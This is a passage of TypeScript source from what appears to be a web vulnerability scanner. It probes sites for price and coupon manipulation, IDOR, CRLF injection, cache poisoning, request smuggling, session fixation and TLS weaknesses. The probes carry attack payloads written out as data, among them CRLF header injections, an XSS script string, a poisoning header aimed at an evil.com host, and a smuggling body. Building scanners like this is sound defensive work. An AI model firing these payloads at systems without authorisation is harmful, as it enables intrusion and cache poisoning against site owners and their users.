    if (!resp || (resp.status !== 200 && resp.status !== 201)) return null;
    const contentType = (resp.headers.get("content-type") || "").toLowerCase();
    const text = await resp.text().catch(() => "");
    if (isSpaHtmlFallback(resp, text)) return null;
    if (!contentType.includes("application/json") && !text.trim().startsWith("{") && !text.trim().startsWith("[")) {
      return null;
    }
    try {
      const json = JSON.parse(text);
      if (!json || typeof json !== "object") return null;
      if (json.status === "error" || json.success === false || json.error) return null;
      const msg = String(json.message || json.detail || json.error || "").toLowerCase();
      if (msg.includes("invalid") || msg.includes("not found") || msg.includes("failed") || msg.includes("denied")) return null;
      return json;
    } catch {
      return null;
    }
  };

  // Test 1: Negative price manipulation (API endpoints only)
  const priceEndpoints = [
    "/api/basket", "/api/cart", "/api/orders", "/rest/basket", "/api/v1/basket",
    "/api/v2/basket", "/api/order", "/api/v1/order", "/api/shop/basket", "/api/shop/cart", "/rest/cart", "/rest/order",
  ];
  for (const path of priceEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const negativePriceBody = { productId: 1, quantity: 1, price: -100, total: -100 };

      const resp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(negativePriceBody),
      }, 6000, false, session);

      const json = await isSuccessfulJsonResponse(resp);
      if (json && (json.price === -100 || json.total === -100 || json.status === "success" || json.id)) {
        findings.push({
          type: "business-logic-price-manipulation",
          severity: "CRITICAL",
          url,
          parameter: "price",
          evidence: `Business Logic vulnerability: Negative price manipulation confirmed. The endpoint accepted a negative price value (-100) and returned a successful JSON order response.`,
          cvssScore: 9.1,
          cveId: "CWE-840",
          isVerified: true,
          confidence: CONFIDENCE.EXEC_VERIFIED,
        });
        break;
      }
    } catch { /* next endpoint */ }
  }

  // Test 2: Coupon manipulation (API endpoints only)
  const couponEndpoints = [
    "/api/coupon", "/api/coupons", "/api/apply-coupon", "/rest/coupon",
    "/api/v1/coupon", "/api/v2/coupon", "/api/discount", "/api/promo", "/api/promotion",
  ];
  for (const path of couponEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const couponPayloads = [
        { code: "ADMIN100", discount: 100 },
        { code: "FREE", discount: 100 },
        { code: "UNLIMITED", discount: 999 },
      ];

      for (const payload of couponPayloads) {
        const resp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }, 6000, false, session);

        const json = await isSuccessfulJsonResponse(resp);
        if (json && (json.discount === payload.discount || json.code === payload.code || json.applied === true)) {
          findings.push({
            type: "business-logic-coupon-abuse",
            severity: "HIGH",
            url,
            parameter: "code",
            evidence: `Business Logic vulnerability: Coupon manipulation confirmed. The endpoint accepted coupon code "${payload.code}" and returned discount application response.`,
            cvssScore: 7.5,
            cveId: "CWE-840",
            isVerified: true,
            confidence: CONFIDENCE.DUAL_VERIFIED,
          });
          break;
        }
      }
    } catch { /* next endpoint */ }
  }

  // Test 3: Feedback/review manipulation (API endpoints only)
  const feedbackEndpoints = [
    "/api/feedback", "/api/reviews", "/api/review", "/rest/feedback",
    "/api/v1/feedback", "/api/v2/feedback", "/api/comment", "/api/comments", "/rest/review",
  ];
  for (const path of feedbackEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const manipulationPayloads = [
        { rating: 999, comment: "test" },
        { rating: -1, comment: "test" },
        { rating: 5, comment: "<script>alert(1)</script>" },
      ];

      for (const payload of manipulationPayloads) {
        const resp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }, 6000, false, session);

        const json = await isSuccessfulJsonResponse(resp);
        if (json && (json.rating === payload.rating || json.id || json.status === "success")) {
          findings.push({
            type: "business-logic-feedback-manipulation",
            severity: "MEDIUM",
            url,
            parameter: "rating",
            evidence: `Business Logic vulnerability: Feedback manipulation. The endpoint accepted out-of-bounds rating value (${payload.rating}) without validation.`,
            cvssScore: 5.3,
            cveId: "CWE-840",
            isVerified: true,
            confidence: CONFIDENCE.DUAL_VERIFIED,
          });
          break;
        }
      }
    } catch { /* next endpoint */ }
  }

  return findings;

}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #9: PASSWORD POLICY TESTING (CWE-521)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Tests password policy enforcement by attempting to register with weak passwords
 * and checking if they are accepted.
 */
async function probePasswordPolicy(baseUrl: string, session: AuthSession): Promise<PendingFinding | null> {
  const registerEndpoints = [
    "/api/register", "/api/signup", "/api/users", "/rest/user/register",
    "/api/auth/register", "/api/v1/register", "/api/v2/register", "/user/register",
    "/auth/register", "/register", "/signup", "/users", "/create-account",
  ];

  const weakPasswords = [
    "123456",
    "password",
    "admin",
    "test",
    "qwerty",
    "12345678",
    "abc123",
  ];

  for (const path of registerEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();

      for (const weakPassword of weakPasswords) {
        const testEmail = `test_${Date.now()}@vulnscan.internal`;
        const body = {
          email: testEmail,
          password: weakPassword,
          username: "testuser"
        };

        const resp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        }, 6000, false, session);

        if (resp && (resp.status === 200 || resp.status === 201)) {
          return {
            type: "weak-password-policy",
            severity: "MEDIUM",
            url,
            parameter: "password",
            evidence: `Weak password policy detected. Registration endpoint accepted weak password "${weakPassword}" without enforcing complexity requirements. This makes users susceptible to brute-force and dictionary attacks.`,
            cvssScore: 5.9,
            cveId: "CWE-521",
          };
        }
      }
    } catch { /* next endpoint */ }
  }

  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #5: MULTI-USER PRIVILEGE ESCALATION / IDOR-BOLA WITH DUAL-TOKEN
// ══════════════════════════════════════════════════════════════════════════════

/**
 * IDOR / BOLA Testing with Dual-Token cross-account access check.
 *
 * Requires TWO sessions (user1 and user2). Fetches a resource using user1's
 * credentials, then attempts to access the same resource with user2's token.
 * If user2 gets a 200 with user1's data — confirmed IDOR (OWASP A01 / CWE-639).
 */
async function probeIDORWithDualToken(baseUrl: string, jsBundleEndpoints: JsApiEndpoint[], session: AuthSession): Promise<PendingFinding | null> {
  // We need two distinct authenticated sessions to test BOLA
  if (!session.bearerToken || !session.bearerToken2) return null;
  if (!session.userId || String(session.userId).trim().length === 0) return null;

  const targetUserId = String(session.userId).trim();

  // Common patterns for user-specific resource endpoints (explicitly excluding self-me endpoints)
  const userResourcePaths = [
    `/api/users/${targetUserId}`,
    `/api/user/${targetUserId}`,
    `/api/Users/${targetUserId}`,
    `/api/account/${targetUserId}`,
    `/api/profile/${targetUserId}`,
    `/api/v1/users/${targetUserId}`,
  ];

  // Also check js-discovered endpoints that contain the user ID
  const discoveredUserPaths = jsBundleEndpoints
    .filter(e => e.path.includes(targetUserId) || e.path.includes(":id") || e.path.includes(":userId"))
    .map(e => e.path.replace(":id", targetUserId).replace(":userId", targetUserId))
    .filter(p => !p.endsWith("/me") && !p.endsWith("/change-password"))
    .slice(0, 3);

  const allPaths = [...new Set([...userResourcePaths, ...discoveredUserPaths])];

  for (const path of allPaths) {
    try {
      const url = new URL(path, baseUrl).toString();

      // Fetch with User 1's token
      const resp1 = await fetch(url, {
        headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken}` },
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp1 || resp1.status !== 200) continue;
      const body1 = await resp1.text().catch(() => "");
      if (!body1 || body1.length < 20) continue;

      // Access User 1's specific resource URL with User 2's token (cross-account)
      const resp2 = await fetch(url, {
        headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken2}` },
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp2 || resp2.status !== 200) continue;

      const body2 = await resp2.text().catch(() => "");
      try {
        const json2 = JSON.parse(body2);
        const jsonStr = JSON.stringify(json2);

        // Confirm IDOR: User 2's cross-account response contains User 1's ID in an identifier field
        // or matches User 1's unique response payload structure
        const hasExplicitUserKey =
          jsonStr.includes(`"id":"${targetUserId}"`) ||
          jsonStr.includes(`"id":${targetUserId}`) ||
          jsonStr.includes(`"userId":"${targetUserId}"`) ||
          jsonStr.includes(`"userId":${targetUserId}`) ||
          jsonStr.includes(`"ownerId":"${targetUserId}"`) ||
          jsonStr.includes(`"ownerId":${targetUserId}`);

        if (hasExplicitUserKey || (targetUserId.length >= 4 && jsonStr.includes(targetUserId))) {
          return {
            type: "idor-bola",
            severity: "CRITICAL",
            url,
            parameter: "Authorization",
            evidence: `Insecure Direct Object Reference (IDOR/BOLA) confirmed at ${url}. ` +
              `User 2 successfully accessed resource owned by User 1 (ID: ${targetUserId}) using User 2's bearer token. ` +
              `The server returned HTTP 200 with User 1's account data, confirming missing object-level authorization.`,
            cvssScore: 9.1,
            cveId: "CWE-639",
            isVerified: true,
            confidence: CONFIDENCE.DUAL_VERIFIED,
          };
        }
      } catch { /* not json */ }
    } catch { /* next path */ }
  }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// IMPROVEMENT #1: CRLF INJECTION / HTTP RESPONSE SPLITTING (CWE-113)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Injects CRLF (\r\n) sequences into URL params to test for HTTP header injection.
 * If the injected header appears in the response, the server is vulnerable to
 * session fixation, cache poisoning, and XSS via header injection.
 */
async function probeCRLFInjection(paramUrl: string): Promise<PendingFinding | null> {
  const CRLF_PAYLOADS = [
    { inject: "\r\nInjected-Header: vulnscan-crlf-test", headerName: "injected-header", headerVal: "vulnscan-crlf-test" },
    { inject: "%0d%0aInjected-Header:%20vulnscan-crlf-test", headerName: "injected-header", headerVal: "vulnscan-crlf-test" },
    { inject: "%0d%0aSet-Cookie:%20vulnscan=crlfpoc", headerName: "set-cookie", headerVal: "vulnscan=crlfpoc" },
  ];

  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params.slice(0, 3)) {
      const origVal = u.searchParams.get(param) ?? "";
      for (const { inject, headerName, headerVal } of CRLF_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, origVal + inject);
          const resp = await safeFetch(testUrl.toString(), 5000);
          if (!resp) continue;

          const injectedValue = resp.headers.get(headerName) ?? "";
          if (injectedValue.includes(headerVal)) {
            // Confirm with a second distinct payload
            const confirmUrl = new URL(u.toString());
            confirmUrl.searchParams.set(param, origVal + "%0d%0aX-Confirm: vulnscan-confirmed");
            const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
            const confirmHeader = confirmResp?.headers.get("x-confirm") ?? "";
            if (!confirmHeader.includes("vulnscan-confirmed")) continue;

            return {
              type: "crlf-injection",
              severity: "HIGH",
              url: testUrl.toString(),
              parameter: param,
              evidence: `CRLF Injection (HTTP Response Splitting) confirmed. Injecting CRLF characters into parameter "${param}" caused the server to emit an injected HTTP header "${headerName}: ${headerVal}". Confirmed with a second payload. Attackers can inject Set-Cookie headers for session fixation, add malicious Location redirects, or inject Content-Type + body for XSS.`,
              cvssScore: 8.1,
              cveId: "CWE-113",
              confidence: CONFIDENCE.DUAL_VERIFIED,
              validationSteps: [`Payload injected "${headerName}: ${headerVal}" into response headers`, "Second payload (X-Confirm) also appeared in response headers"],
              isVerified: true,
            };
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// IMPROVEMENT #5: WEB CACHE POISONING DETECTION (CWE-349)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Tests for web cache poisoning by injecting X-Forwarded-Host with a unique
 * cache-buster, then re-requesting cleanly. If the clean response still
 * contains the injected host, the cache is poisoned.
 */
async function probeCachePoisoning(targetUrl: string): Promise<PendingFinding | null> {
  const EVIL_HOST = "vulnscan-cache-poison-test.evil.com";
  const cacheBuster = "_vulnscan_cb=" + Date.now().toString(36);

  try {
    const poisonUrl = targetUrl + (targetUrl.includes("?") ? "&" : "?") + cacheBuster;

    // Step 1: Send a poisoning request
    const poisonResp = await fetch(poisonUrl, {
      headers: {
        ...FETCH_HEADERS,
        "X-Forwarded-Host": EVIL_HOST,
        "X-Host": EVIL_HOST,
        "X-Forwarded-Server": EVIL_HOST,
      },
      signal: AbortSignal.timeout(6000),
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);
    if (!poisonResp || poisonResp.status >= 400) return null;

    // Step 2: Wait briefly for cache to store
    await new Promise(r => setTimeout(r, 500));

    // Step 3: Send a CLEAN request (no evil headers)
    const cleanResp = await fetch(poisonUrl, {
      headers: FETCH_HEADERS,
      signal: AbortSignal.timeout(6000),
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);
    if (!cleanResp) return null;

    const cleanBody = await cleanResp.text();
    const cleanLocation = cleanResp.headers.get("location") ?? "";

    if (cleanBody.includes(EVIL_HOST) || cleanLocation.includes(EVIL_HOST)) {
      return {
        type: "web-cache-poisoning",
        severity: "CRITICAL",
        url: poisonUrl,
        evidence: `Web Cache Poisoning confirmed. After sending a request with X-Forwarded-Host: "${EVIL_HOST}", a subsequent clean request (without the evil header) still returned the poisoned content. The cache stored the poisoned response and will serve it to all visitors. Attackers can inject malicious scripts, redirect users, or serve phishing pages to every visitor.`,
        cvssScore: 9.3,
        cveId: "CWE-349",
      };
    }
  } catch { /* skip */ }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// IMPROVEMENT #6: HTTP REQUEST SMUGGLING DETECTION (CWE-444)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Tests for CL/TE and TE/CL HTTP request smuggling by sending ambiguous
 * Content-Length + Transfer-Encoding headers.
 */
async function probeHTTPRequestSmuggling(targetUrl: string): Promise<PendingFinding | null> {
  const CL_TE_BODY = "0\r\n\r\nSMUGGLED";

  try {
    // Test 1: CL.TE — Only flag if smuggled payload execution is confirmed
    const clTeResp = await fetch(targetUrl, {
      method: "POST",
      headers: {
        ...FETCH_HEADERS,
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "0",
        "Transfer-Encoding": "chunked",
      },
      body: CL_TE_BODY,
      signal: AbortSignal.timeout(8000),
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);

    if (clTeResp && clTeResp.status < 400) {
      const body = await clTeResp.text().catch(() => "");
      if (body.includes("SMUGGLED")) {
        return {
          type: "http-request-smuggling",
          severity: "CRITICAL",
          url: targetUrl,
          evidence: "HTTP Request Smuggling (CL.TE desync) confirmed. The backend server executed the smuggled request body prefix ('SMUGGLED'), demonstrating frontend/backend header desynchronization.",
          cvssScore: 9.8,
          cveId: "CWE-444",
          isVerified: true,
          confidence: CONFIDENCE.DUAL_VERIFIED,
        };
      }
    }
  } catch { /* skip */ }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// IMPROVEMENT #7: LIGHTWEIGHT SUBDOMAIN ENUMERATION
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes common subdomains via HTTP HEAD requests.
 * Reports discovered live subdomains as INFO-level findings.
 */
async function probeCommonSubdomains(targetUrl: string): Promise<PendingFinding | null> {
  const COMMON_SUBDOMAINS = [
    "admin", "api", "staging", "dev", "test", "beta", "internal",
    "vpn", "mail", "dashboard", "jenkins", "gitlab", "sentry",
    "grafana", "kibana", "monitoring", "status", "docs", "cdn",
  ];

  const MULTI_TENANT_SUFFIXES = [
    "herokuapp.com", "vercel.app", "netlify.app", "github.io", "gitlab.io",
    "pages.dev", "azurewebsites.net", "amazonaws.com", "cloud.google.com",
    "firebaseapp.com", "web.app", "onrender.com", "fly.dev", "railway.app"
  ];

  let hostname: string;
  let protocol: string;
  try {
    const parsed = new URL(targetUrl);
    hostname = parsed.hostname.toLowerCase();
    protocol = parsed.protocol;
  } catch { return null; }

  // Skip IP addresses or multi-tenant public cloud hosting domains
  if (/^\d+\./.test(hostname)) return null;
  if (MULTI_TENANT_SUFFIXES.some(suffix => hostname.endsWith(suffix))) {
    return null; // Skip enumeration on multi-tenant SaaS / cloud platform suffixes
  }

  const parts = hostname.split(".");
  if (parts.length > 3) return null;
  const baseDomain = parts.length >= 2 ? parts.slice(-2).join(".") : hostname;

  const liveSubdomains: string[] = [];

  const probePromises = COMMON_SUBDOMAINS.map(async (sub) => {
    const subUrl = `${protocol}//${sub}.${baseDomain}`;
    try {
      const resp = await fetch(subUrl, {
        method: "HEAD",
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(3000),
        redirect: "manual",
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (resp && resp.status >= 200 && resp.status < 400) {
        liveSubdomains.push(`${sub}.${baseDomain} (HTTP ${resp.status})`);
      }
    } catch { /* unreachable */ }
  });

  await Promise.all(probePromises);

  if (liveSubdomains.length > 0) {
    return {
      type: "subdomain-enumeration",
      severity: "INFO",
      url: targetUrl,
      evidence: `Discovered ${liveSubdomains.length} live subdomain(s) via HTTP probing: ${liveSubdomains.join(", ")}. These subdomains expand the attack surface and may run different software versions, have weaker security configurations, or expose internal services.`,
      cvssScore: 3.0,
      cveId: "CWE-200",
    };
  }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// IMPROVEMENT #8: SESSION FIXATION -- SESSION ID REGENERATION CHECK
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Tests whether the application regenerates session IDs after authentication.
 */
async function probeSessionFixationRegeneration(
  targetUrl: string,
  session: AuthSession
): Promise<PendingFinding | null> {
  if (!session.bearerToken) return null;

  try {
    // Step 1: Fetch WITHOUT credentials
    const unauthResp = await fetch(targetUrl, {
      headers: FETCH_HEADERS,
      signal: AbortSignal.timeout(6000),
      redirect: "follow",
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);
    if (!unauthResp) return null;

    const unauthCookies = unauthResp.headers.get("set-cookie") ?? "";
    const unauthSessionCookie = extractSessionCookieHelper(unauthCookies);
    if (!unauthSessionCookie.value) return null;

    // Step 2: Fetch WITH credentials
    const authedResp = await fetch(targetUrl, {
      headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken}` },
      signal: AbortSignal.timeout(6000),
      redirect: "follow",
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);
    if (!authedResp) return null;

    const authedCookies = authedResp.headers.get("set-cookie") ?? "";
    const authedSessionCookie = extractSessionCookieHelper(authedCookies);

    // Step 3: Compare
    if (
      authedSessionCookie.value &&
      unauthSessionCookie.name === authedSessionCookie.name &&
      unauthSessionCookie.value === authedSessionCookie.value &&
      unauthSessionCookie.value.length >= 8
    ) {
      return {
        type: "session-fixation-no-regeneration",
        severity: "HIGH",
        url: targetUrl,
        parameter: unauthSessionCookie.name,
        evidence: `Session Fixation vulnerability: the session cookie "${unauthSessionCookie.name}" was NOT regenerated after authentication. Pre-auth and post-auth session IDs are identical. An attacker who sets a victim's session ID (via XSS, CRLF injection, or subdomain cookie) can wait for the victim to log in, then use the same session ID to hijack their authenticated session.`,
        cvssScore: 8.0,
        cveId: "CWE-384",
      };
    }
  } catch { /* skip */ }
  return null;
}

/** Helper: extract the first session-like cookie name+value from a Set-Cookie header. */
function extractSessionCookieHelper(setCookieHeader: string): { name: string; value: string } {
  for (const cookie of setCookieHeader.split(/,(?=[^ ])/)) {
    const nameValue = cookie.split(";")[0];
    const eqIdx = nameValue.indexOf("=");
    if (eqIdx === -1) continue;
    const name = nameValue.slice(0, eqIdx).trim();
    const value = nameValue.slice(eqIdx + 1).trim();
    if (/session|sess|sid|auth|token|jsessionid|phpsessid|connect\.sid/i.test(name)) {
      return { name, value };
    }
  }
  return { name: "", value: "" };
}

// ══════════════════════════════════════════════════════════════════════════════
// TLS / SSL CERTIFICATE ANALYSIS (CWE-295 / CWE-326)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Connects to the target via TLS and inspects the certificate and protocol:
 *  - Expired certificate
 *  - Certificate expiring within 30 days
 *  - Self-signed / untrusted certificate
 *  - Weak TLS protocol version (TLS 1.0 or 1.1)
 */
async function probeTLSCertificate(targetUrl: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  if (!targetUrl.startsWith("https://")) {
    findings.push({
      type: "no-https",
      severity: "HIGH",
      url: targetUrl,
      evidence:
        "The target site does not use HTTPS. All data (including passwords, session tokens, and personal information) " +
        "is transmitted in cleartext and can be intercepted by any network observer (MITM attack).",
      cvssScore: 7.5,
      cveId: "CWE-319",
    });
    return findings;
  }

  let hostname: string;
  let port: number;
  try {
    const parsed = new URL(targetUrl);
    hostname = parsed.hostname;
    port = parseInt(parsed.port || "443", 10);
  } catch {
    return findings;
  }

  return new Promise<PendingFinding[]>((resolve) => {
    const timeout = setTimeout(() => {
      socket.destroy();
      resolve(findings);
    }, 8000);

    const socket = tls.connect(
      { host: hostname, port, servername: hostname, rejectUnauthorized: false },
      () => {
        try {
          const cert = socket.getPeerCertificate(true);
          const proto = socket.getProtocol() ?? "";

          // 1. Weak TLS version
          if (proto === "TLSv1" || proto === "TLSv1.1") {
            findings.push({
              type: "weak-tls-version",
              severity: "HIGH",
              url: targetUrl,
              evidence:
                `The server negotiated ${proto}, a deprecated TLS version with known weaknesses ` +
                `(BEAST, POODLE attacks). Modern browsers are deprecating TLS 1.0/1.1. ` +
                `Upgrade to TLS 1.2 minimum (TLS 1.3 recommended).`,
              cvssScore: 7.5,
              cveId: "CWE-326",
            });
          }

          if (!cert || !cert.valid_to) {
            socket.end();
            clearTimeout(timeout);
            resolve(findings);
            return;
          }

          const validTo = new Date(cert.valid_to);
          const now = new Date();
          const daysLeft = Math.floor((validTo.getTime() - now.getTime()) / (1000 * 60 * 60 * 24));

          // 2. Expired certificate
          if (daysLeft < 0) {
            findings.push({
              type: "expired-tls-certificate",
              severity: "CRITICAL",
              url: targetUrl,
              evidence:
                `The TLS certificate for ${hostname} expired ${Math.abs(daysLeft)} day(s) ago ` +
                `(expired: ${cert.valid_to}). Browsers will show a "Not Secure" warning and ` +
                `refuse to connect, making the site inaccessible. An expired cert also signals ` +
                `that certificate management processes have failed, potentially allowing MitM attacks.`,
              cvssScore: 9.1,
              cveId: "CWE-295",
            });
          } else if (daysLeft < 30) {
            // 3. Expiring soon
            findings.push({
              type: "expiring-tls-certificate",
              severity: "HIGH",
              url: targetUrl,
              evidence:
                `The TLS certificate for ${hostname} expires in ${daysLeft} day(s) ` +
                `(expires: ${cert.valid_to}). Failure to renew will cause browser warnings and ` +
                `service disruption. Set up auto-renewal via Let's Encrypt / ACME.`,
              cvssScore: 7.5,
              cveId: "CWE-295",
            });
          }

          // 4. Self-signed certificate
          const issuerCN = cert.issuer?.CN ?? "";
          const subjectCN = cert.subject?.CN ?? "";
          if (issuerCN && subjectCN && issuerCN === subjectCN) {
            findings.push({
              type: "self-signed-tls-certificate",
              severity: "HIGH",
              url: targetUrl,
              evidence:
                `The TLS certificate for ${hostname} appears to be self-signed ` +
                `(Issuer CN === Subject CN: "${issuerCN}"). Self-signed certificates ` +
                `are not trusted by browsers, generate security warnings, and make ` +
                `users more susceptible to accepting fraudulent certificates in real attacks.`,
              cvssScore: 6.5,
              cveId: "CWE-295",
            });
          }
        } catch { /* cert parse error */ }

        socket.end();
        clearTimeout(timeout);
        resolve(findings);
      }
    );

    socket.on("error", () => {
      clearTimeout(timeout);
      resolve(findings);
    });
  });
}

async function runAsyncAIAnalysis(findingId: string, pending: PendingFinding) {
  try {
    const ragQuery = `${pending.type} ${pending.evidence || ""}`.slice(0, 300);
    const context = await retrieveContext(ragQuery, 3);

    const report = await generateFixReport({
      findingType: pending.type,
      url: pending.url,
      parameter: pending.parameter,
      evidence: pending.evidence,
      cveId: pending.cveId,
      ragContext: context,
    });

    const stepsJson = JSON.stringify(report.fixSteps);
    const codeExampleJson = JSON.stringify(report.codeExample);

    await prisma.finding.update({
      where: { id: findingId },
      data: {
        title: report.title,
        explanation: report.explanation,
        fixSteps: stepsJson as any,
        codeExample: codeExampleJson as any,
      },
    });
  } catch (err) {
    console.error(`❌ Failed to run async AI analysis for finding ${findingId}:`, err);
  }
}

async function saveFindingInstantly(
  scanId: string,
  pending: PendingFinding,
  backgroundAiPromises: Promise<any>[]
) {
  try {
    const created = await prisma.finding.create({
      data: {
        scanId,
        type: pending.type,
        severity: pending.severity,
        url: pending.url,
        parameter: pending.parameter ?? null,
        evidence: pending.evidence ?? null,
        cvssScore: pending.cvssScore,
        cveId: pending.cveId ?? null,
        confidence: pending.confidence ?? 0.85,
        validationSteps: JSON.stringify(pending.validationSteps ?? []) as any,
        isVerified: pending.isVerified ?? false,
        title: `Analyzing ${pending.type}...`,
        explanation: "AI remediation report is being generated in the background...",
      },
    });

    const aiPromise = runAsyncAIAnalysis(created.id, pending);
    backgroundAiPromises.push(aiPromise);
  } catch (err) {
    console.error("❌ Failed to save finding instantly:", err);
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// PHASE 3: CONTEXT FILTERING — suppress known-noisy / low-value finding types
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Returns false for findings that are systematically noisy or not actionable.
 * Applied in the findings.push interceptor before saving.
 */
function passesContextFilter(f: PendingFinding): boolean {
  const evidence = f.evidence ?? "";

  // 1. Subdomain enumeration: skip cloud preview/staging domains (not real vulns)
  if (f.type === "subdomain-enumeration") {
    if (/vercel.app|netlify.app|github.io|fly.dev|cloudflare.net|pages.dev/i.test(evidence)) {
      return false;
    }
  }

  // 2. Passive SSRF signals: parameter name match ≠ confirmed SSRF.
  //    The blind-SSRF-timing probe covers real SSRF with confirmation.
  if (f.type === "ssrf-parameter-signal") {
    return false;
  }

  // 3. Backup files: only keep if evidence mentions sensitive content
  if (f.type === "exposed-backup-files") {
    return /password|api.?key|secret|token|credential|database/i.test(evidence);
  }

  // 4. Mixed content: only keep if there are actual references (not 0)
  if (f.type === "mixed-content" && /0 reference/.test(evidence)) {
    return false;
  }

  // 5. IDOR numeric ID: passive signal only - URL contains a number. Too noisy.
  //    The probeIDORWithDualToken probe covers confirmed IDOR.
  if (f.type === "idor-numeric-id") {
    return false;
  }

  // 6. Tech fingerprinting: INFO severity only, useful but not a vulnerability.
  //    Keep it, but it will be naturally filtered by confidence gate if low-confidence.
  //    (We keep this for the report completeness.)

  return true;
}

function getDeduplicationKey(item: PendingFinding): string {
  // Normalize finding types into canonical groups
  let type = item.type.toLowerCase();
  if (type.startsWith("ssti")) type = "ssti-injection";
  if (type.includes("xss") || type.includes("js-dangerous-sink")) type = "xss";

  // Normalize parameter names (strip spaces, extra quotes, leading/trailing whitespace)
  const param = (item.parameter || "").toLowerCase().replace(/['"`\s]/g, "");

  // FP-FIX: Site-global finding types should deduplicate across ALL pages
  const SITE_GLOBAL_TYPES = new Set([
    "technology-fingerprinting",
    "missing-hsts",
    "missing-x-content-type-options",
    "missing-referrer-policy",
    "missing-permissions-policy",
    "missing-rate-limiting",
    "rate-limit-active",
    "rate-limit-unverified",
    "rate-limit-headers-present",
    "cors-wildcard",
    "cors-credentials-wildcard",
    "server-version-disclosure",
    "subdomain-enumeration",
    "subdomain-takeover-signal",
    "ssrf-parameter-signal",
    "http-request-smuggling",
    "web-cache-poisoning",
  ]);
  if (SITE_GLOBAL_TYPES.has(type)) {
    return `${type}:site-global:${param}`;
  }

  let normalizedUrl = item.url.toLowerCase();
  try {
    const parsed = new URL(item.url);
    // Normalize path segments (numeric IDs, UUIDs, :param templates)
    const segments = parsed.pathname.split("/").map(seg => {
      if (/^\d+$/.test(seg) || /^:[a-z0-9_]+$/i.test(seg) || /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(seg)) {
        return ":id";
      }
      return seg;
    });
    parsed.pathname = segments.join("/");
    parsed.search = "";
    parsed.hash = "";
    normalizedUrl = parsed.toString();
  } catch {
    // fallback
  }

  return `${type}:${normalizedUrl}:${param}`;
}

// ══════════════════════════════════════════════════════════════════════════════
// OPENAPI / SWAGGER DISCOVERY — @apidevtools/swagger-parser
// Surfaces API endpoints that are invisible in HTML (REST APIs documented via
// OpenAPI specs expose the full attack surface: paths, methods, parameters).
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes common OpenAPI/Swagger spec paths and parses any discovered specs.
 * Returns a list of JsApiEndpoint-compatible objects for use by injection probes.
 * Uses @apidevtools/swagger-parser for robust JSON/YAML spec parsing and
 * $ref resolution (which SwaggerParser.parse() handles automatically).
 *
 * Handles two Swagger UI patterns:
 * 1. Direct JSON spec at /openapi.json, /swagger.json etc. (standard)
 * 2. Swagger UI HTML page (e.g. Juice Shop's /api-docs) — the actual spec URL is
 *    embedded in the HTML as `url: "..."` in the SwaggerUIBundle config.
 */
async function discoverOpenApiEndpoints(baseUrl: string, log: (m: string) => void): Promise<JsApiEndpoint[]> {
  const SPEC_PATHS = [
    '/openapi.json',
    '/openapi.yaml',
    '/swagger.json',
    '/swagger.yaml',
    '/api-docs',
    '/api-docs.json',
    '/api/swagger.json',
    '/swagger/v1/swagger.json',
    '/v1/swagger.json',
    '/v2/api-docs',
    '/v3/api-docs',
  ];

  const results: JsApiEndpoint[] = [];

  /** Try to parse a spec URL and extract endpoints. Returns count or 0. */
  const parseSpec = async (specUrl: string): Promise<number> => {
    try {
      const api = await SwaggerParser.parse(specUrl) as any;
      const paths = api?.paths || {};
      let count = 0;
      for (const [path, pathItem] of Object.entries(paths as Record<string, any>)) {
        const methods = ['get', 'post', 'put', 'patch', 'delete'] as const;
        for (const method of methods) {
          const operation = (pathItem as any)?.[method];
          if (!operation) continue;
          const fields = new Set<string>();
          const params: any[] = operation.parameters || (pathItem as any).parameters || [];
          for (const p of params) { if (p?.name) fields.add(p.name); }
